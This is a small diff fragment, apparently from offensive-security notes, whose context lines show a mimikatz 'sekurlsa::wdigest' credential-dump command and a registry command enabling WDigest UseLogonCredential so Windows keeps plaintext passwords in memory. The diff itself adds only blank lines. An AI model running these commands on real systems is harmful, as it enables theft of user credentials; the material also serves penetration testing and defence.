@@ -20,3 +20,5 @@ mimikatz_command -f sekurlsa::wdigest
 # create a DWORD 'UseLogonCredential' with the value 1.
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
 ```
+
+
